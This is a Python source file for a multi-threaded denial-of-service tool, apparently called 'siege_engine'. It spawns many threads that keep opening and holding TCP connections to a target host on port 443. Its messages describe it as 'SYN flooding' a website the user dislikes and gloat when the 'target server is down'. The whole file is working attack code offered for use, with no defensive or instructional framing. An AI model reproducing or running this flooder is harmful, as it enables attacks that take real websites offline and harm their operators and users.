import socket
import threading
import time
import sys

connections = 0

def flood_tcp(host: str):
    global connections
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((host, 443))
        time.sleep(3)
        sock.close()
        connections += 1
    except (socket.error, socket.timeout):
        pass


class DoYourThing(threading.Thread):
    def __init__(self, hostname: str):
        self.hostname = hostname
        super().__init__(daemon=True)

    def run(self):
        while True:
            flood_tcp(self.hostname)


def run():
    global connections
    if len(sys.argv) < 3:
        print('Correct usage is python -m siege_engine number-of-threads-you-want-to-ping this-website-that-i-dislike.ru')
        sys.exit(1)
    amount, hostname = sys.argv[1:]
    print('SYN flooding %s on %s threads' % (hostname, amount))
    amount = int(amount)
    now = (time.time())
    for _ in range(amount):
        DoYourThing(hostname).start()
    wasted_bytes = 0
    while True:
        try:
            if int(time.time()) != now:
                now = int(time.time())
                if connections == 0:
                    print('The target server is down. Let us keep it that way.')
                else:
                    print('Last seconds made', connections, 'calls which involved', connections*24, 'wasted bytes on the behalf of',
                          hostname)
                    wasted_bytes += connections * 24
                    connections = 0
        except KeyboardInterrupt:
            print('Good job, you wasted', wasted_bytes, 'bytes of traffic! Good bye and have a nice day!')
            break